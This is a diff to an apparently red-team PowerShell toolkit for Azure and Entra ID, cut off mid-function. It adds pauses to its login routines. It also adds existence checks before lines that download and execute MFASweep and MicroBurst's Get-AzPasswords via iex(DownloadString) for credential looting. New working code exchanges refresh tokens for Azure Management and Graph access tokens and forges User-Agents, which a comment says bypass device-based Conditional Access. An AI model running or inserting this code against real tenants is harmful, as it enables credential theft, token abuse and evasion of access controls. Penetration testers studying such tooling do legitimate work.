@@ -298,12 +298,15 @@ function Login-AzureCLI {
             $Global:azureCliId = $userId
 
             Write-Host "Successfully logged into Azure CLI as $azureCliAccount." -ForegroundColor Green
+            Pause
         } else {
             Write-Host "Tenant must be set before logging in. Please set the tenant first." -ForegroundColor Red
+            Pause
         }
     }
     catch {
         Write-Host "Error during Azure CLI login: $_" -ForegroundColor Red
+        Pause
     }
 }
 
@@ -330,9 +333,11 @@ function Login-AzureCLI-SP {
         $Global:azureCliSPName = $spDetails.SpName
         
         Write-Host "Successfully logged into Azure CLI as Service Principal ($spDetails.Name)." -ForegroundColor Green
+        Pause
     }
     catch {
         Write-Host "Failed to login to Azure CLI as Service Principal: $_" -ForegroundColor Red
+        Pause
     }
 
     Write-Host "`nPress any key to return to the login menu..."
@@ -389,12 +394,15 @@ function Login-AzModule {
             $userId = (Get-AzADUser -UserPrincipalName $Global:azModuleAccount).Id
             $Global:azModuleId = $userId
             Write-Host "Successfully logged into Az PowerShell module as $azModuleAccount." -ForegroundColor Green
+            Pause
         } else {
             Write-Host "Tenant must be set before logging in. Please set the tenant first." -ForegroundColor Red
+            Pause
         }
     }
     catch {
         Write-Host "Failed to login to Az PowerShell module: $_" -ForegroundColor Red
+        Pause
     }
 }
 
@@ -421,12 +429,15 @@ function Login-AzModule-AT {
             $userId = (Get-AzADUser -UserPrincipalName $Global:azModuleAccount).Id
             $Global:azModuleId = $userId
             Write-Host "Successfully logged into Az PowerShell module as $azModuleAccount." -ForegroundColor Green
+            Pause
         } else {
             Write-Host "Tenant must be set before logging in. Please set the tenant first." -ForegroundColor Red
+            Pause
         }
     }
     catch {
         Write-Host "Failed to login to Az PowerShell module: $_" -ForegroundColor Red
+        Pause
     }
 }
 
@@ -442,12 +453,15 @@ function Login-AzModule-DC {
             $userId = (Get-AzADUser -UserPrincipalName $Global:azModuleAccount).Id
             $Global:azModuleId = $userId
             Write-Host "Successfully logged into Az PowerShell module as $azModuleAccount." -ForegroundColor Green
+            Pause
         } else {
             Write-Host "Tenant must be set before logging in. Please set the tenant first." -ForegroundColor Red
+            Pause
         }
     }
     catch {
         Write-Host "Failed to login to Az PowerShell module: $_" -ForegroundColor Red
+        Pause
     }
 }
 
@@ -478,9 +492,11 @@ function Login-AzModule-SP {
         $Global:azModuleSPName = $spDetails.AppId
 
         Write-Host "Successfully logged into Az PowerShell module as Service Principal ($spDetails.DisplayName)." -ForegroundColor Green
+        Pause
     }
     catch {
         Write-Host "Detailed error during login: $($_.Exception.Message)" -ForegroundColor Red
+        Pause
     }
 
     Write-Host "`nPress any key to return to the login menu..."
@@ -534,12 +550,15 @@ function Login-GraphModule {
             $Global:graphModuleAccount = (Get-MgContext).Account
             $Global:graphModuleId = (Get-MgUser -UserId $Global:graphModuleAccount).Id
             Write-Host "Successfully logged into Microsoft Graph PS module as $graphModuleAccount." -ForegroundColor Green
+            Pause
         } else {
             Write-Host "Tenant must be set before logging in. Please set the tenant first." -ForegroundColor Red
+            Pause
         }
     }
     catch {
         Write-Host "Failed to login to Microsoft Graph PS module: $_" -ForegroundColor Red
+        Pause
     }
 }
 
@@ -560,12 +579,15 @@ function Login-GraphModule-AT {
             $Global:graphModuleAccount = (Get-MgContext).Account
             $Global:graphModuleId = (Get-MgUser -UserId $Global:graphModuleAccount).Id
             Write-Host "Successfully logged into Microsoft Graph PowerShell module as $graphModuleAccount." -ForegroundColor Green
+            Pause
         } else {
             Write-Host "Tenant must be set before logging in. Please set the tenant first." -ForegroundColor Red
+            Pause
         }
     }
     catch {
         Write-Host "Failed to login to Microsoft Graph PowerShell module: $_" -ForegroundColor Red
+        Pause
     }
 }
 
@@ -582,12 +604,15 @@ function Login-GraphModule-DC {
             $Global:graphModuleAccount = (Get-MgContext).Account
             $Global:graphModuleId = (Get-MgUser -UserId $Global:graphModuleAccount).Id
             Write-Host "Successfully logged into Microsoft Graph PowerShell module as $graphModuleAccount." -ForegroundColor Green
+            Pause
         } else {
             Write-Host "Tenant must be set before logging in. Please set the tenant first." -ForegroundColor Red
+            Pause
         }
     }
     catch {
         Write-Host "Failed to login to Microsoft Graph PowerShell module: $_" -ForegroundColor Red
+        Pause
     }
 }
 
@@ -1831,9 +1856,15 @@ function MFASweep {
     DisplayHeader
     Write-Host "MFA Sweep" -ForegroundColor Cyan
 
-    # Download and execute MFASweep 
-    Write-Host "Downloading and running MFASweep from GitHub..." -ForegroundColor Yellow
-    iex(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/dafthack/MFASweep/master/MFASweep.ps1")
+    # Download and execute MFASweep
+    if (Get-Command -Name Invoke-MFASweep -ErrorAction SilentlyContinue) {
+        Write-Host "Invoke-MFASweeps is already available." -ForegroundColor Green
+    } else {
+        Write-Host "Invoke-MFASweep is not available." -ForegroundColor Red 
+        Write-Host "Downloading and running MFASweep from GitHub..." -ForegroundColor Yellow
+        iex(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/dafthack/MFASweep/master/MFASweep.ps1")
+    }
+
     Invoke-MFASweep
     
     Write-Host "`nPress any key to return to the Attacks menu..."
@@ -2626,12 +2657,363 @@ function LootAzPasswords {
     Write-Host "Looting possible passwords via MicroBurt's Get-AzPasswords" -ForegroundColor Cyan
 
     # Download and execute the script 
-    Write-Host "Downloading and running Get-AzPasswords.ps1 from GitHub..." -ForegroundColor Yellow
-    iex(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/NetSPI/MicroBurst/refs/heads/master/Az/Get-AzPasswords.ps1")
+    # Check if Get-AzPasswords Module is available
+    if (Get-Command -Name Get-AzPasswords -ErrorAction SilentlyContinue) {
+        Write-Host "Get-AzPasswords is already available." -ForegroundColor Green
+    } else {
+        Write-Host "Get-AzPasswords is not available." -ForegroundColor Red
+        Write-Host "Downloading and running Get-AzPasswords.ps1 from GitHub..." -ForegroundColor Yellow
+        iex(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/NetSPI/MicroBurst/refs/heads/master/Az/Get-AzPasswords.ps1")
+    }
     Get-AzPasswords -Verbose | Out-GridView
     
     Write-Host "`nPress any key to return to the Loot menu..."
     [void][System.Console]::ReadKey($true)
+}
+
+<#
+BSD 3-Clause License
+
+Copyright (c) 2021, Steve Borosh
+All rights reserved.
+
+Redistribution and use in source and binary forms, with or without
+modification, are permitted provided that the following conditions are met:
+
+1. Redistributions of source code must retain the above copyright notice, this
+   list of conditions and the following disclaimer.
+
+2. Redistributions in binary form must reproduce the above copyright notice,
+   this list of conditions and the following disclaimer in the documentation
+   and/or other materials provided with the distribution.
+
+3. Neither the name of the copyright holder nor the names of its
+   contributors may be used to endorse or promote products derived from
+   this software without specific prior written permission.
+
+THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
+AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
+IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
+DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
+FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
+DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
+SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
+CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
+OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
+OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+Using functions from TokenTactics v2 from Fabian Bader to convert Refresh Tokens to Access Tokens
+https://github.com/f-bader/TokenTacticsV2
+#>
+function TokensMenu {
+    while ($true) {
+        Clear-Host
+        DisplayHeader
+        Write-Host "Tokens Menu with Functions from Fabian Bader's TokenTactics v2" -ForegroundColor Cyan
+        Write-Host "1. Invoke-RefreshToAzureManagementToken"
+        Write-Host "2. Invoke-RefreshToAzureCoreManagementToken"
+        Write-Host "3. Invoke-RefreshToGraphToken"
+        Write-Host "B. Return to Main Menu"
+
+        $userInput = Read-Host -Prompt "Select an option"
+        switch ($userInput) {
+            "1" {
+                Invoke-RefreshToAzureManagementToken
+            }
+            "2" {
+                Invoke-RefreshToAzureCoreManagementToken
+            }
+            "3" {
+                Invoke-RefreshToGraphToken
+            }
+            "B" {
+                return
+            }
+            default {
+                Write-Host "Invalid selection, please try again."
+                Write-Host "`nPress any key to continue..."
+                [void][System.Console]::ReadKey($true)
+            }
+        }
+    }
+}
+
+function Invoke-RefreshToToken {
+    [CmdletBinding()]
+    param (
+        [Parameter(Mandatory = $true)]
+        [string]$Domain,
+        [Parameter(Mandatory = $true)]
+        [string]$refreshToken,
+        [Parameter(Mandatory = $true)]
+        [string]$ClientID,
+        [Parameter(Mandatory = $true)]
+        [string]$Scope,
+        [Parameter(Mandatory = $false)]
+        [string]$Resource,
+        [Parameter(Mandatory = $False)]
+        [String]$Device,
+        [Parameter(Mandatory = $False)]
+        [String]$Browser,
+        [Parameter(Mandatory = $False)]
+        [Switch]$UseCAE,
+        [Parameter(Mandatory = $False)]
+        [Switch]$UseDoD,
+        [Parameter(Mandatory = $False)]
+        [Switch]$UseV1Endpoint
+    )
+
+    if ($Device) {
+        if ($Browser) {
+            $UserAgent = Invoke-ForgeUserAgent -Device $Device -Browser $Browser
+        } else {
+            $UserAgent = Invoke-ForgeUserAgent -Device $Device
+        }
+    } else {
+        if ($Browser) {
+            $UserAgent = Invoke-ForgeUserAgent -Browser $Browser
+        } else {
+            $UserAgent = Invoke-ForgeUserAgent
+        }
+    }
+
+    Write-Verbose "UserAgent: $UserAgent"
+
+    $Headers = @{}
+    $Headers["User-Agent"] = $UserAgent
+
+    $TenantId = $Global:tenantID
+    if ($UseDoD) {
+        $authUrl = "https://login.microsoftonline.us/$($TenantId)"
+    } else {
+        $authUrl = "https://login.microsoftonline.com/$($TenantId)"
+    }
+
+
+    Write-Verbose $refreshToken
+
+    $body = @{
+        "scope"         = $Scope
+        "client_id"     = $ClientId
+        "grant_type"    = "refresh_token"
+        "refresh_token" = $refreshToken
+    }
+
+    if ($UseCAE) {
+        # Add 'cp1' as client claim to get a access token valid for 24 hours
+        $Claims = ( @{"access_token" = @{ "xms_cc" = @{ "values" = @("cp1") } } } | ConvertTo-Json -Compress -Depth 99 )
+        $body.Add("claims", $Claims)
+    }
+
+    if ($Resource) {
+        $body.Add("resource", $Resource)
+    }
+
+    Write-Verbose ( $body | ConvertTo-Json -Depth 99)
+
+    if ($UseV1Endpoint) {
+        $uri = "$($authUrl)/oauth2/token"
+    } else {
+        $uri = "$($authUrl)/oauth2/v2.0/token"
+    }
+
+    $Token = Invoke-RestMethod -UseBasicParsing -Method Post -Uri $uri -Headers $Headers -Body $body
+    Return $Token
+}
+
+function Invoke-RefreshToAzureManagementToken {
+    <#
+    .DESCRIPTION
+        Generate a Microsoft Azure Management token from a refresh token.
+    .EXAMPLE
+        Invoke-RefreshToAzureManagementToken -RefreshToken ey....
+        $AzureManagementToken.access_token
+    #>
+    [cmdletbinding()]
+    Param(
+        [Parameter(Mandatory = $true)]
+        [string]$RefreshToken = $response.refresh_token,
+        [Parameter(Mandatory = $false)]
+        $ClientId = "d3590ed6-52b3-4102-aeff-aad2292ab01c",
+        [Parameter(Mandatory = $false)]
+        [Switch]$UseCAE
+    )
+
+    # Define initial parameters
+    $Parameters = @{
+        Domain       = $Global:tenantid
+        refreshToken = $RefreshToken
+        ClientID     = $ClientId
+        UseCAE       = $UseCAE
+        Scope        = "https://management.azure.com/.default offline_access openid"
+    }
+
+    # Device and Browser options
+    $deviceOptions = @('Mac', 'Windows', 'Linux', 'AndroidMobile', 'iPhone', 'OS/2')
+    $browserOptions = @('Android', 'IE', 'Chrome', 'Firefox', 'Edge', 'Safari')
+
+    # Prompt user for custom headers
+    Write-Host "Would you like to specify a custom Device and Browser header? (Y/N)" -ForegroundColor Yellow
+    $customHeaders = Read-Host
+
+    if ($customHeaders -eq "Y") {
+        # Display device options
+        Write-Host "Select Device:" -ForegroundColor Yellow
+        for ($i = 0; $i -lt $deviceOptions.Count; $i++) {
+            Write-Host "$($i + 1). $($deviceOptions[$i])"
+        }
+        $selectedDeviceIndex = Read-Host "Enter the number corresponding to the Device"
+        $Parameters.Device = $deviceOptions[$selectedDeviceIndex - 1]
+
+        # Display browser options
+        Write-Host "Select Browser:" -ForegroundColor Yellow
+        for ($i = 0; $i -lt $browserOptions.Count; $i++) {
+            Write-Host "$($i + 1). $($browserOptions[$i])"
+        }
+        $selectedBrowserIndex = Read-Host "Enter the number corresponding to the Browser"
+        $Parameters.Browser = $browserOptions[$selectedBrowserIndex - 1]
+    }
+
+    # Invoke the token retrieval function
+    $Global:AzureManagementToken = Invoke-RefreshToToken @Parameters
+    
+    Write-Host ("Token acquired") -ForegroundColor Green
+    Write-Host ("Type: $($AzureManagementToken.token_type)") -ForegroundColor Green
+    Write-Host ("Scope: $($AzureManagementToken.scope)") -ForegroundColor Green
+    Write-Host ("Expires in: $($AzureManagementToken.expires_in)") -ForegroundColor Green
+    Write-Host ("FOCI: $($AzureManagementToken.foci)") -ForegroundColor Green
+    Write-Host ("Access Token: $($AzureManagementToken.access_token)") -ForegroundColor DarkMagenta
+    Pause
+}
+
+function Invoke-RefreshToAzureCoreManagementToken {
+    <#
+    .DESCRIPTION
+        Generate a Microsoft Azure Core Mangement token from a refresh token.
+    .EXAMPLE
+        Invoke-RefreshToAzureCoreManagementToken -domain myclient.org -refreshToken ey....
+        $AzureCoreManagementToken.access_token
+    #>
+    [cmdletbinding()]
+    Param(
+        [Parameter(Mandatory = $true)]
+        [string]$RefreshToken = $response.refresh_token,
+        [Parameter(Mandatory = $false)]
+        $ClientId = "d3590ed6-52b3-4102-aeff-aad2292ab01c",
+        [Parameter(Mandatory = $False)]
+        [Switch]$UseCAE
+    )
+
+    $Parameters = @{
+        Domain       = $Global:tenantid
+        refreshToken = $refreshToken
+        ClientID     = $ClientID
+        Device       = $Device
+        Browser      = $Browser
+        UseCAE       = $UseCAE
+        Scope        = "https://management.core.windows.net/.default offline_access openid"
+    }
+
+    # Device and Browser options
+    $deviceOptions = @('Mac', 'Windows', 'Linux', 'AndroidMobile', 'iPhone', 'OS/2')
+    $browserOptions = @('Android', 'IE', 'Chrome', 'Firefox', 'Edge', 'Safari')
+
+    # Prompt user for custom headers
+    Write-Host "Would you like to specify a custom Device and Browser header? (Y/N)" -ForegroundColor Yellow
+    $customHeaders = Read-Host
+
+    if ($customHeaders -eq "Y") {
+        # Display device options
+        Write-Host "Select Device:" -ForegroundColor Yellow
+        for ($i = 0; $i -lt $deviceOptions.Count; $i++) {
+            Write-Host "$($i + 1). $($deviceOptions[$i])"
+        }
+        $selectedDeviceIndex = Read-Host "Enter the number corresponding to the Device"
+        $Parameters.Device = $deviceOptions[$selectedDeviceIndex - 1]
+
+        # Display browser options
+        Write-Host "Select Browser:" -ForegroundColor Yellow
+        for ($i = 0; $i -lt $browserOptions.Count; $i++) {
+            Write-Host "$($i + 1). $($browserOptions[$i])"
+        }
+        $selectedBrowserIndex = Read-Host "Enter the number corresponding to the Browser"
+        $Parameters.Browser = $browserOptions[$selectedBrowserIndex - 1]
+    }
+
+    $global:AzureCoreManagementToken = Invoke-RefreshToToken @Parameters
+        
+    Write-Host ("Token acquired") -ForegroundColor Green
+    Write-Host ("Type: $($AzureCoreManagementToken.token_type)") -ForegroundColor Green
+    Write-Host ("Scope: $($AzureCoreManagementToken.scope)") -ForegroundColor Green
+    Write-Host ("Expires in: $($AzureCoreManagementToken.expires_in)") -ForegroundColor Green
+    Write-Host ("FOCI: $($AzureCoreManagementToken.foci)") -ForegroundColor Green
+    Write-Host ("Access Token: $($AzureCoreManagementToken.access_token)") -ForegroundColor DarkMagenta
+    Pause
+}
+
+function Invoke-RefreshToGraphToken {
+    <#
+    .DESCRIPTION
+        Generate a windows graph token from a refresh token.
+    .EXAMPLE
+        Invoke-RefreshToGraphToken -domain myclient.org -refreshToken ey....
+        $GraphToken.access_token
+    #>
+    [cmdletbinding()]
+    Param(
+        [Parameter(Mandatory = $true)]
+        [string]$RefreshToken = $response.refresh_token,
+        [Parameter(Mandatory = $false)]
+        [string]$ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c",
+        [Parameter(Mandatory = $False)]
+        [Switch]$UseCAE
+    )
+
+    $Parameters = @{
+        Domain       = $Global:tenantID
+        refreshToken = $refreshToken
+        ClientID     = $ClientID
+        Device       = $Device
+        Browser      = $Browser
+        UseCAE       = $UseCAE
+        Scope        = "https://graph.windows.net/.default offline_access openid"
+    }
+
+    # Device and Browser options
+    $deviceOptions = @('Mac', 'Windows', 'Linux', 'AndroidMobile', 'iPhone', 'OS/2')
+    $browserOptions = @('Android', 'IE', 'Chrome', 'Firefox', 'Edge', 'Safari')
+
+    # Prompt user for custom headers
+    Write-Host "Would you like to specify a custom Device and Browser header? (Y/N)" -ForegroundColor Yellow
+    $customHeaders = Read-Host
+
+    if ($customHeaders -eq "Y") {
+        # Display device options
+        Write-Host "Select Device:" -ForegroundColor Yellow
+        for ($i = 0; $i -lt $deviceOptions.Count; $i++) {
+            Write-Host "$($i + 1). $($deviceOptions[$i])"
+        }
+        $selectedDeviceIndex = Read-Host "Enter the number corresponding to the Device"
+        $Parameters.Device = $deviceOptions[$selectedDeviceIndex - 1]
+
+        # Display browser options
+        Write-Host "Select Browser:" -ForegroundColor Yellow
+        for ($i = 0; $i -lt $browserOptions.Count; $i++) {
+            Write-Host "$($i + 1). $($browserOptions[$i])"
+        }
+        $selectedBrowserIndex = Read-Host "Enter the number corresponding to the Browser"
+        $Parameters.Browser = $browserOptions[$selectedBrowserIndex - 1]
+    }
+
+    $global:GraphToken = Invoke-RefreshToToken @Parameters
+    Write-Output "$([char]0x2713)  Token acquired and saved as `$GraphToken"
+    $GraphToken | Select-Object token_type, scope, expires_in, ext_expires_in | Format-List
+    Write-Host ("Token acquired") -ForegroundColor Green
+    Write-Host ("Type: $($GraphToken.token_type)") -ForegroundColor Green
+    Write-Host ("Scope: $($GraphToken.scope)") -ForegroundColor Green
+    Write-Host ("Expires in: $($GraphToken.expires_in)") -ForegroundColor Green
+    Write-Host ("FOCI: $($GraphToken.foci)") -ForegroundColor Green
+    Write-Host ("Access Token: $($GraphToken.access_token)") -ForegroundColor DarkMagenta
+    Pause
 }
 
 # Main menu structure
@@ -2646,6 +3028,7 @@ function ToolMenu {
         Write-Host "2. Queries"
         Write-Host "3. Attacks"
         Write-Host "4. Loot"
+        Write-Host "5. Tokens"
         Write-Host "C. Check Tools and Updates"
         Write-Host "Q. Quit"
 
@@ -2662,6 +3045,9 @@ function ToolMenu {
             }
             "4" {
                 LootMenu
+            }
+            "5" {
+                TokensMenu
             }
             "C" {
                 Clear-Host
@@ -2950,143 +3336,114 @@ function Get-GraphTokens{
 
 function Invoke-ForgeUserAgent
 {
-      <#
+    <#
     .DESCRIPTION
         Forge the User-Agent when sending requests to the Microsoft API's. Useful for bypassing device specific Conditional Access Policies. Defaults to Windows Edge.
     #>
     [cmdletbinding()]
     Param(
-        [Parameter(Mandatory=$False)]
-        [ValidateSet('Mac','Windows','AndroidMobile','iPhone')]
-        [String]$Device,
-        [Parameter(Mandatory=$False)]
-        [ValidateSet('Android','IE','Chrome','Firefox','Edge','Safari')]
-        [String]$Browser
+        [Parameter(Mandatory = $False)]
+        [ValidateSet('Mac', 'Windows', 'Linux', 'AndroidMobile', 'iPhone', 'OS/2')]
+        [String]$Device = "Windows",
+        [Parameter(Mandatory = $False)]
+        [ValidateSet('Android', 'IE', 'Chrome', 'Firefox', 'Edge', 'Safari')]
+        [String]$Browser = "Edge"
     )
-    Process
-    {
-        if ($Device -eq 'Mac')
-        {
-            if ($Browser -eq 'Chrome')
-            {
+    Process {
+        if ($Device -eq 'Mac') {
+            if ($Browser -eq 'Chrome') {
                 $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36'
-            }
-            elseif ($Browser -eq 'Firefox')
-            {
+            } elseif ($Browser -eq 'Firefox') {
                 $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:70.0) Gecko/20100101 Firefox/70.0'
-            }
-            elseif ($Browser -eq 'Edge')
-            {
+            } elseif ($Browser -eq 'Edge') {
                 $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/604.1 Edg/91.0.100.0'
-            }
-            elseif ($Browser -eq 'Safari')
-            {
+            } elseif ($Browser -eq 'Safari') {
+                $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'
+            } else {
+                Write-Warning "Device platform not found, defaulting to macos/Safari"
                 $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'
             }
-            else 
-            {
-                $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'
-            }
-        }
-        elseif ($Device -eq 'Windows')
-        {
-            if ($Browser -eq 'IE')
-            {
+        } elseif ($Device -eq 'Windows') {
+            if ($Browser -eq 'IE') {
                 $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko'
-            }
-            elseif ($Browser -eq 'Chrome')
-            {
+            } elseif ($Browser -eq 'Chrome') {
                 $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36'
-            }
-            elseif ($Browser -eq 'Firefox')
-            {
+            } elseif ($Browser -eq 'Firefox') {
                 $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:70.0) Gecko/20100101 Firefox/70.0'
-            }
-            elseif ($Browser -eq 'Edge')
-            {
+            } elseif ($Browser -eq 'Edge') {
+                $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19042'
+            } else {
+                Write-Warning "Device platform not found, defaulting to Windows/Edge"
                 $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19042'
             }
-            else 
-            {
-                $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19042'
-            }
-        }
-        elseif ($Device -eq 'AndroidMobile')
-        {
-            if ($Browser -eq 'Android')
-            {
+        } elseif ($Device -eq 'AndroidMobile') {
+            if ($Browser -eq 'Android') {
                 $UserAgent = 'Mozilla/5.0 (Linux; U; Android 4.0.2; en-us; Galaxy Nexus Build/ICL53F) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
-            }
-            elseif ($Browser -eq 'Chrome')
-            {
-                $UserAgent = 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36'
-            }
-            elseif ($Browser -eq 'Firefox')
-            {
+            } elseif ($Browser -eq 'Chrome') {
+                $UserAgent = 'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36'
+            } elseif ($Browser -eq 'Firefox') {
                 $UserAgent = 'Mozilla/5.0 (Android 4.4; Mobile; rv:70.0) Gecko/70.0 Firefox/70.0'
-            }
-            elseif ($Browser -eq 'Edge')
-            {
-                $UserAgent = 'Mozilla/5.0 (Linux; Android 8.1.0; Pixel Build/OPM4.171019.021.D1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36 EdgA/42.0.0.2057'
-            }
-            else 
-            {
+            } elseif ($Browser -eq 'Edge') {
+                $UserAgent = 'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Mobile Safari/537.36 EdgA/103.0.1264.71'
+            } else {
+                Write-Warning "Device platform not found, defaulting to Android/Chrome"
                 $UserAgent = 'Mozilla/5.0 (Linux; U; Android 4.0.2; en-us; Galaxy Nexus Build/ICL53F) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
             }
-        }
-        elseif ($Device -eq 'iPhone')
-        {
-            if ($Browser -eq 'Chrome')
-            {
+        } elseif ($Device -eq 'iPhone') {
+            if ($Browser -eq 'Chrome') {
                 $UserAgent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/91.0.4472.114 Mobile/15E148 Safari/604.1'
-            }
-            elseif ($Browser -eq 'Firefox')
-            {
+            } elseif ($Browser -eq 'Firefox') {
                 $UserAgent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) FxiOS/1.0 Mobile/12F69 Safari/600.1.4'
-            }
-            elseif ($Browser -eq 'Edge')
-            {
+            } elseif ($Browser -eq 'Edge') {
                 $UserAgent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 EdgiOS/44.5.0.10 Mobile/15E148 Safari/604.1'
-            }
-            elseif ($Browser -eq 'Safari')
-            {
+            } elseif ($Browser -eq 'Safari') {
+                $UserAgent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1'
+            } else {
+                Write-Warning "Device platform not found, defaulting to iPhone/Safari"
                 $UserAgent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1'
             }
-            else 
-            {
-                $UserAgent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1'
+        } elseif ($Device -eq 'Linux') {
+            if ($Browser -eq 'Chrome') {
+                $UserAgent = 'Mozilla/5.0 (M12; Linux X12-12) AppleWebKit/806.12 (KHTML, like Gecko) Ubuntu/23.04 Chrome/113.0.5672.63 Safari/16.4.1'
+            } elseif ($Browser -eq 'Firefox') {
+                $UserAgent = 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.14) Gecko/2009090217 Ubuntu/9.04 (jaunty) Firefox/52.7.3'
+            } elseif ($Browser -eq 'Edge') {
+                $UserAgent = 'Mozilla/5.0 (Wayland; Linux x86_64; Surface) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Ubuntu/23.04 Edg/114.0.1823.43'
+            } else {
+                Write-Warning "Device platform not found, defaulting to Linux/Firefox"
+                $UserAgent = 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.14) Gecko/2009090217 Ubuntu/9.04 (jaunty) Firefox/52.7.3'
             }
-        }
-        else 
-        {
-            #[ValidateSet('Android','IE','Chrome','Firefox','Edge','Safari')]
-            if ($Browser -eq 'Android')
-            {
+        } elseif ($Device -eq 'OS/2') {
+            if ($Browser -eq 'Firefox') {
+                $UserAgent = 'Mozilla/5.0 (OS/2; U; Warp 4.5; en-US; rv:80.7.12) Gecko/20050922 Firefox/80.0.7'
+            } else {
+                Write-Warning "Device platform not found, defaulting to OS/2 Firefox"
+                $UserAgent = 'Mozilla/5.0 (OS/2; U; Warp 4.5; en-US; rv:80.7.12) Gecko/20050922 Firefox/80.0.7'
+            }
+        } else {
+            if ($Browser -eq 'Android') {
+                Write-Warning "Device platform not found, defaulting to Android"
                 $UserAgent = 'Mozilla/5.0 (Linux; U; Android 4.0.2; en-us; Galaxy Nexus Build/ICL53F) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
-            }
-            elseif($Browser -eq 'IE')
-            { 
+            } elseif ($Browser -eq 'IE') {
+                Write-Warning "Device platform not found, defaulting to Windows/IE"
                 $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko'
-            }
-            elseif($Browser -eq 'Chrome')
-            { 
+            } elseif ($Browser -eq 'Chrome') {
+                Write-Warning "Device platform not found, defaulting to macos/Chrome"
                 $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36'
-            }
-            elseif($Browser -eq 'Firefox')
-            { 
+            } elseif ($Browser -eq 'Firefox') {
+                Write-Warning "Device platform not found, defaulting to Windows/Firefox"
                 $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:70.0) Gecko/20100101 Firefox/70.0'
